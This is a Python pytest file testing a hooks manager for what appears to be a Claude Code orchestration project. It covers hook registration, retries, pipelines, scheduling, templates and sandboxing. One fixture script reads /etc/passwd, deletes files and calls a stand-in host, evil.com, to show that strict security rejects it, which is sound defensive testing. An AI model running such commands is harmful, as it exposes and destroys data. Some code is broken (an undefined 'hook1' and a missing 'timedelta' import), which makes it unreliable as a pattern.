"""
Exhaustive functional tests for EVERY hooks system function.
Tests all hooks functionality with real Claude Code execution.
"""

import pytest
import asyncio
import json
import tempfile
import shutil
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any, Optional, Callable

from shannon_mcp.hooks.manager import HooksManager, Hook, HookEvent
from shannon_mcp.hooks.executor import HookExecutor
from shannon_mcp.hooks.registry import HookRegistry
from shannon_mcp.managers.session import SessionManager
from shannon_mcp.managers.binary import BinaryManager
from shannon_mcp.storage.database import Database


class TestCompleteHooksSystem:
    """Test every single hooks system function comprehensively."""
    
    @pytest.fixture
    async def hooks_setup(self):
        """Set up hooks testing environment."""
        temp_dir = tempfile.mkdtemp()
        db_path = Path(temp_dir) / "hooks.db"
        
        db = Database(db_path)
        await db.initialize()
        
        binary_manager = BinaryManager()
        session_manager = SessionManager(binary_manager=binary_manager)
        
        registry = HookRegistry(db=db)
        executor = HookExecutor()
        hooks_manager = HooksManager(
            registry=registry,
            executor=executor,
            session_manager=session_manager
        )
        
        await hooks_manager.initialize()
        
        # Create test scripts directory
        scripts_dir = Path(temp_dir) / "scripts"
        scripts_dir.mkdir()
        
        yield {
            "manager": hooks_manager,
            "registry": registry,
            "executor": executor,
            "session_manager": session_manager,
            "db": db,
            "temp_dir": temp_dir,
            "scripts_dir": scripts_dir
        }
        
        # Cleanup
        await hooks_manager.cleanup()
        await session_manager.cleanup()
        await db.close()
        shutil.rmtree(temp_dir)
    
    async def test_hooks_manager_initialization(self, hooks_setup):
        """Test HooksManager initialization with all options."""
        db = hooks_setup["db"]
        
        # Test with default options
        manager1 = HooksManager(db=db)
        await manager1.initialize()
        assert manager1.max_hooks == 100
        assert manager1.execution_timeout == 30
        
        # Test with custom options
        manager2 = HooksManager(
            db=db,
            max_hooks=50,
            execution_timeout=60,
            parallel_execution=True,
            max_parallel=5,
            retry_failed=True,
            max_retries=3,
            log_executions=True
        )
        await manager2.initialize()
        assert manager2.max_hooks == 50
        assert manager2.execution_timeout == 60
        assert manager2.parallel_execution is True
        assert manager2.max_parallel == 5
    
    async def test_hook_registration_complete(self, hooks_setup):
        """Test hook registration with all options."""
        manager = hooks_setup["manager"]
        scripts_dir = hooks_setup["scripts_dir"]
        
        # Create test hook scripts
        shell_script = scripts_dir / "test_hook.sh"
        shell_script.write_text("""#!/bin/bash
echo "Hook executed: $1"
echo "Session ID: $SESSION_ID"
echo "Event: $EVENT_TYPE"
exit 0
""")
        shell_script.chmod(0o755)
        
        python_script = scripts_dir / "test_hook.py"
        python_script.write_text("""#!/usr/bin/env python3
import sys
import os
import json

event_data = json.loads(sys.argv[1]) if len(sys.argv) > 1 else {}
print(f"Python hook executed: {event_data}")
print(f"Environment: {os.environ.get('SESSION_ID', 'N/A')}")
""")
        python_script.chmod(0o755)
        
        # Test basic hook registration
        hook1 = await manager.register_hook({
            "name": "BasicHook",
            "event": "session.start",
            "command": str(shell_script)
        })
        assert hook1.id is not None
        assert hook1.name == "BasicHook"
        assert hook1.event == "session.start"
        assert hook1.enabled is True
        
        # Test hook with full configuration
        hook2 = await manager.register_hook({
            "name": "AdvancedHook",
            "event": "session.complete",
            "command": str(python_script),
            "description": "Advanced Python hook with full config",
            "enabled": True,
            "priority": 10,
            "timeout": 45,
            "retry_on_failure": True,
            "max_retries": 2,
            "retry_delay": 5,
            "environment": {
                "CUSTOM_VAR": "custom_value",
                "DEBUG": "true"
            },
            "working_directory": str(scripts_dir),
            "run_in_background": False,
            "capture_output": True,
            "success_codes": [0, 1],
            "tags": ["testing", "python", "advanced"],
            "metadata": {
                "author": "test_user",
                "version": "1.0.0"
            }
        })
        assert hook2.priority == 10
        assert hook2.timeout == 45
        assert hook2.environment["CUSTOM_VAR"] == "custom_value"
        assert hook2.tags == ["testing", "python", "advanced"]
        
        # Test different event types
        events = [
            "session.start",
            "session.complete",
            "session.error",
            "prompt.before",
            "prompt.after",
            "response.received",
            "checkpoint.created",
            "checkpoint.restored",
            "agent.task_start",
            "agent.task_complete",
            "error.occurred",
            "metric.threshold",
            "custom.event"
        ]
        
        for event in events:
            hook = await manager.register_hook({
                "name": f"Hook_{event.replace('.', '_')}",
                "event": event,
                "command": f"echo 'Handling {event}'"
            })
            assert hook.event == event
    
    async def test_hook_execution_complete(self, hooks_setup):
        """Test hook execution with all scenarios."""
        manager = hooks_setup["manager"]
        session_manager = hooks_setup["session_manager"]
        scripts_dir = hooks_setup["scripts_dir"]
        
        # Create various test scripts
        success_script = scripts_dir / "success.sh"
        success_script.write_text("""#!/bin/bash
echo "Success output"
echo "Error output" >&2
exit 0
""")
        success_script.chmod(0o755)
        
        failure_script = scripts_dir / "failure.sh"
        failure_script.write_text("""#!/bin/bash
echo "Failing..."
exit 1
""")
        failure_script.chmod(0o755)
        
        slow_script = scripts_dir / "slow.sh"
        slow_script.write_text("""#!/bin/bash
sleep 2
echo "Finally done"
""")
        slow_script.chmod(0o755)
        
        data_script = scripts_dir / "data.py"
        data_script.write_text("""#!/usr/bin/env python3
import sys
import json

data = json.loads(sys.argv[1])
print(json.dumps({
    "received": data,
    "processed": True,
    "count": len(data)
}))
""")
        data_script.chmod(0o755)
        
        # Register hooks
        success_hook = await manager.register_hook({
            "name": "SuccessHook",
            "event": "test.success",
            "command": str(success_script)
        })
        
        failure_hook = await manager.register_hook({
            "name": "FailureHook",
            "event": "test.failure",
            "command": str(failure_script),
            "retry_on_failure": True,
            "max_retries": 2
        })
        
        timeout_hook = await manager.register_hook({
            "name": "TimeoutHook",
            "event": "test.timeout",
            "command": str(slow_script),
            "timeout": 1
        })
        
        data_hook = await manager.register_hook({
            "name": "DataHook",
            "event": "test.data",
            "command": str(data_script) + " '{data}'"
        })
        
        # Test successful execution
        result1 = await manager.execute_hook(
            event="test.success",
            context={"session_id": "test_session"}
        )
        assert result1["success"] is True
        assert "Success output" in result1["output"]
        assert "Error output" in result1["error"]
        
        # Test failure with retry
        result2 = await manager.execute_hook(
            event="test.failure",
            context={"session_id": "test_session"}
        )
        assert result2["success"] is False
        assert result2["retries"] == 2
        
        # Test timeout
        result3 = await manager.execute_hook(
            event="test.timeout",
            context={"session_id": "test_session"}
        )
        assert result3["success"] is False
        assert "timeout" in result3["error"].lower()
        
        # Test data passing
        test_data = {"items": ["a", "b", "c"], "count": 3}
        result4 = await manager.execute_hook(
            event="test.data",
            context={"session_id": "test_session"},
            data=test_data
        )
        assert result4["success"] is True
        parsed = json.loads(result4["output"])
        assert parsed["received"] == test_data
        assert parsed["processed"] is True
    
    async def test_hook_conditions_filters(self, hooks_setup):
        """Test hook conditions and filters."""
        manager = hooks_setup["manager"]
        scripts_dir = hooks_setup["scripts_dir"]
        
        # Create conditional script
        conditional_script = scripts_dir / "conditional.sh"
        conditional_script.write_text("""#!/bin/bash
echo "Condition met, executing hook"
""")
        conditional_script.chmod(0o755)
        
        # Register hooks with conditions
        hook1 = await manager.register_hook({
            "name": "ConditionalHook1",
            "event": "session.complete",
            "command": str(conditional_script),
            "conditions": {
                "min_duration": 60,  # Only if session > 1 minute
                "max_duration": 3600,  # Only if session < 1 hour
                "success_only": True
            }
        })
        
        hook2 = await manager.register_hook({
            "name": "ConditionalHook2",
            "event": "prompt.after",
            "command": str(conditional_script),
            "conditions": {
                "prompt_contains": ["error", "bug", "issue"],
                "response_contains": ["fixed", "resolved"],
                "min_tokens": 100
            }
        })
        
        hook3 = await manager.register_hook({
            "name": "ConditionalHook3",
            "event": "metric.threshold",
            "command": str(conditional_script),
            "conditions": {
                "metric_name": "memory_usage",
                "threshold": 80,
                "comparison": "greater_than"
            }
        })
        
        # Test condition evaluation
        # Session duration condition
        should_run1 = await manager.evaluate_conditions(
            hook1,
            context={
                "duration": 120,  # 2 minutes
                "success": True
            }
        )
        assert should_run1 is True
        
        should_not_run1 = await manager.evaluate_conditions(
            hook1,
            context={
                "duration": 30,  # 30 seconds
                "success": True
            }
        )
        assert should_not_run1 is False
        
        # Content condition
        should_run2 = await manager.evaluate_conditions(
            hook2,
            context={
                "prompt": "I found an error in the code",
                "response": "The error has been fixed",
                "total_tokens": 150
            }
        )
        assert should_run2 is True
        
        # Metric threshold condition
        should_run3 = await manager.evaluate_conditions(
            hook3,
            context={
                "metric_name": "memory_usage",
                "value": 85
            }
        )
        assert should_run3 is True
    
    async def test_hook_chains_pipelines(self, hooks_setup):
        """Test hook chains and pipelines."""
        manager = hooks_setup["manager"]
        scripts_dir = hooks_setup["scripts_dir"]
        
        # Create pipeline scripts
        for i in range(4):
            script = scripts_dir / f"pipeline_{i}.sh"
            script.write_text(f"""#!/bin/bash
INPUT="${{HOOK_PREVIOUS_OUTPUT:-initial}}"
echo "Stage {i}: Processing $INPUT"
echo "HOOK_OUTPUT=stage{i}_$INPUT"
""")
            script.chmod(0o755)
        
        # Create hook pipeline
        pipeline = await manager.create_pipeline({
            "name": "DataProcessingPipeline",
            "description": "Multi-stage data processing",
            "stages": [
                {
                    "name": "validation",
                    "command": str(scripts_dir / "pipeline_0.sh"),
                    "timeout": 30,
                    "continue_on_failure": False
                },
                {
                    "name": "transformation",
                    "command": str(scripts_dir / "pipeline_1.sh"),
                    "timeout": 30
                },
                {
                    "name": "enrichment",
                    "command": str(scripts_dir / "pipeline_2.sh"),
                    "timeout": 30
                },
                {
                    "name": "storage",
                    "command": str(scripts_dir / "pipeline_3.sh"),
                    "timeout": 30
                }
            ]
        })
        
        # Execute pipeline
        result = await manager.execute_pipeline(
            pipeline_id=pipeline.id,
            event="data.process",
            initial_data={"value": "test_data"}
        )
        assert result["success"] is True
        assert len(result["stage_results"]) == 4
        assert all(stage["success"] for stage in result["stage_results"])
        
        # Test conditional pipeline
        conditional_pipeline = await manager.create_pipeline({
            "name": "ConditionalPipeline",
            "stages": [
                {
                    "name": "check",
                    "command": "test -f /tmp/proceed && echo 'proceed' || echo 'stop'",
                    "stop_on_output": "stop"
                },
                {
                    "name": "process",
                    "command": "echo 'Processing...'",
                    "skip_condition": "previous_output == 'stop'"
                }
            ]
        })
        
        # Test hook chaining
        chain = await manager.create_chain({
            "name": "NotificationChain",
            "hooks": [
                {
                    "hook_id": hook1.id,
                    "pass_output": True
                },
                {
                    "command": "echo 'Notification sent'",
                    "only_if_previous_success": True
                }
            ]
        })
    
    async def test_hook_scheduling(self, hooks_setup):
        """Test scheduled hooks."""
        manager = hooks_setup["manager"]
        scripts_dir = hooks_setup["scripts_dir"]
        
        # Create scheduled script
        scheduled_script = scripts_dir / "scheduled.sh"
        scheduled_script.write_text("""#!/bin/bash
echo "Scheduled task executed at $(date)"
""")
        scheduled_script.chmod(0o755)
        
        # Register scheduled hooks
        cron_hook = await manager.register_scheduled_hook({
            "name": "DailyCleanup",
            "command": str(scheduled_script),
            "schedule": {
                "type": "cron",
                "expression": "0 2 * * *",  # 2 AM daily
                "timezone": "UTC"
            },
            "enabled": True
        })
        
        interval_hook = await manager.register_scheduled_hook({
            "name": "HealthCheck",
            "command": str(scheduled_script),
            "schedule": {
                "type": "interval",
                "seconds": 300,  # Every 5 minutes
                "start_immediately": False
            }
        })
        
        # Test schedule validation
        next_run = await manager.get_next_run_time(cron_hook.id)
        assert next_run is not None
        
        # Test manual trigger
        result = await manager.trigger_scheduled_hook(cron_hook.id)
        assert result["success"] is True
        
        # Test schedule management
        await manager.pause_scheduled_hook(interval_hook.id)
        status = await manager.get_scheduled_hook_status(interval_hook.id)
        assert status["paused"] is True
        
        await manager.resume_scheduled_hook(interval_hook.id)
        status = await manager.get_scheduled_hook_status(interval_hook.id)
        assert status["paused"] is False
        
        # Test execution history
        history = await manager.get_scheduled_hook_history(
            cron_hook.id,
            limit=10
        )
        assert len(history) >= 1
    
    async def test_hook_templates_library(self, hooks_setup):
        """Test hook templates and library."""
        manager = hooks_setup["manager"]
        
        # Test built-in templates
        templates = await manager.list_templates()
        assert len(templates) > 0
        
        # Create custom template
        template = await manager.create_template({
            "name": "ErrorNotification",
            "description": "Send notification on errors",
            "category": "notifications",
            "variables": {
                "webhook_url": {
                    "type": "string",
                    "required": True,
                    "description": "Webhook URL for notifications"
                },
                "min_severity": {
                    "type": "string",
                    "default": "error",
                    "choices": ["warning", "error", "critical"]
                }
            },
            "command": """#!/bin/bash
curl -X POST "{webhook_url}" \\
  -H "Content-Type: application/json" \\
  -d '{
    "severity": "{severity}",
    "message": "{message}",
    "timestamp": "{timestamp}"
  }'
""",
            "events": ["error.occurred"],
            "tags": ["notification", "webhook"]
        })
        
        # Use template to create hook
        hook = await manager.create_hook_from_template(
            template_id=template.id,
            variables={
                "webhook_url": "https://example.com/webhook",
                "min_severity": "error"
            },
            name="ProductionErrorNotifier"
        )
        assert hook.name == "ProductionErrorNotifier"
        
        # Test template sharing
        exported = await manager.export_template(template.id)
        assert "name" in exported
        assert "command" in exported
        
        imported = await manager.import_template(exported)
        assert imported.name == template.name
    
    async def test_hook_security_sandboxing(self, hooks_setup):
        """Test hook security and sandboxing."""
        manager = hooks_setup["manager"]
        scripts_dir = hooks_setup["scripts_dir"]
        
        # Create potentially dangerous scripts
        dangerous_script = scripts_dir / "dangerous.sh"
        dangerous_script.write_text("""#!/bin/bash
# Attempt to access sensitive files
cat /etc/passwd
rm -rf /tmp/test
curl http://evil.com/steal
""")
        dangerous_script.chmod(0o755)
        
        # Test security restrictions
        with pytest.raises(Exception):
            await manager.register_hook({
                "name": "DangerousHook",
                "event": "test.danger",
                "command": str(dangerous_script),
                "security_level": "strict"  # Should reject dangerous commands
            })
        
        # Test sandboxed execution
        sandboxed_hook = await manager.register_hook({
            "name": "SandboxedHook",
            "event": "test.sandbox",
            "command": "echo 'Running in sandbox'",
            "sandbox": {
                "enabled": True,
                "filesystem": "readonly",
                "network": "disabled",
                "max_memory": "100M",
                "max_cpu": "50%",
                "allowed_paths": [str(scripts_dir)],
                "blocked_commands": ["curl", "wget", "rm"],
                "timeout": 10
            }
        })
        
        # Test resource limits
        resource_script = scripts_dir / "resource_heavy.sh"
        resource_script.write_text("""#!/bin/bash
# Try to use excessive resources
dd if=/dev/zero of=/tmp/bigfile bs=1M count=1000
""")
        resource_script.chmod(0o755)
        
        limited_hook = await manager.register_hook({
            "name": "ResourceLimitedHook",
            "event": "test.resources",
            "command": str(resource_script),
            "resource_limits": {
                "max_memory": "50M",
                "max_disk": "10M",
                "max_time": 5
            }
        })
        
        # Execute with limits - should fail due to disk limit
        result = await manager.execute_hook(
            event="test.resources",
            context={}
        )
        assert result["success"] is False
        assert "resource limit" in result["error"].lower()
    
    async def test_hook_monitoring_analytics(self, hooks_setup):
        """Test hook monitoring and analytics."""
        manager = hooks_setup["manager"]
        
        # Register hooks for monitoring
        hooks = []
        for i in range(5):
            hook = await manager.register_hook({
                "name": f"MonitoredHook{i}",
                "event": "test.monitor",
                "command": f"echo 'Hook {i} executed'"
            })
            hooks.append(hook)
        
        # Execute hooks multiple times
        for _ in range(10):
            await manager.execute_hook(
                event="test.monitor",
                context={"iteration": _}
            )
        
        # Get execution statistics
        stats = await manager.get_hook_statistics()
        assert stats["total_executions"] >= 50
        assert stats["total_hooks"] >= 5
        
        # Get per-hook statistics
        for hook in hooks:
            hook_stats = await manager.get_hook_statistics(hook.id)
            assert hook_stats["executions"] >= 10
            assert "average_duration" in hook_stats
            assert "success_rate" in hook_stats
        
        # Test performance metrics
        metrics = await manager.get_performance_metrics(
            period="hour",
            grouping="hook"
        )
        assert len(metrics) >= 5
        
        # Test failure analysis
        failures = await manager.analyze_failures(
            time_range="24h",
            group_by="error_type"
        )
        assert isinstance(failures, dict)
        
        # Test execution timeline
        timeline = await manager.get_execution_timeline(
            start_time=datetime.utcnow() - timedelta(hours=1),
            end_time=datetime.utcnow()
        )
        assert len(timeline) >= 50
        
        # Test alerts
        alert = await manager.create_execution_alert({
            "name": "HighFailureRate",
            "condition": "failure_rate > 0.5",
            "window": "5m",
            "actions": ["disable_hook", "notify_admin"]
        })
        assert alert.id is not None
    
    async def test_hook_debugging_tools(self, hooks_setup):
        """Test hook debugging and development tools."""
        manager = hooks_setup["manager"]
        scripts_dir = hooks_setup["scripts_dir"]
        
        # Create debug script
        debug_script = scripts_dir / "debug.sh"
        debug_script.write_text("""#!/bin/bash
echo "Debug: Starting execution"
echo "Args: $@" >&2
echo "Env: $(env | grep HOOK_)" >&2
echo "Debug: Completed"
""")
        debug_script.chmod(0o755)
        
        # Register hook with debugging
        debug_hook = await manager.register_hook({
            "name": "DebugHook",
            "event": "test.debug",
            "command": str(debug_script),
            "debug": True,
            "log_level": "DEBUG"
        })
        
        # Test dry run
        dry_run_result = await manager.dry_run_hook(
            hook_id=debug_hook.id,
            context={"test": "value"},
            capture_output=True
        )
        assert dry_run_result["would_execute"] is True
        assert "command" in dry_run_result
        assert "environment" in dry_run_result
        
        # Test hook validation
        validation = await manager.validate_hook(debug_hook.id)
        assert validation["valid"] is True
        assert validation["executable"] is True
        assert validation["syntax_valid"] is True
        
        # Test execution trace
        trace_result = await manager.execute_hook_with_trace(
            event="test.debug",
            context={"trace": "enabled"}
        )
        assert "trace" in trace_result
        assert "timeline" in trace_result["trace"]
        assert "environment_snapshot" in trace_result["trace"]
        
        # Test hook testing framework
        test_result = await manager.test_hook(
            hook_id=debug_hook.id,
            test_cases=[
                {
                    "name": "basic_test",
                    "context": {"key": "value"},
                    "expected_output": "Debug: Completed",
                    "expected_exit_code": 0
                },
                {
                    "name": "empty_context",
                    "context": {},
                    "expected_exit_code": 0
                }
            ]
        )
        assert test_result["passed"] == 2
        assert test_result["failed"] == 0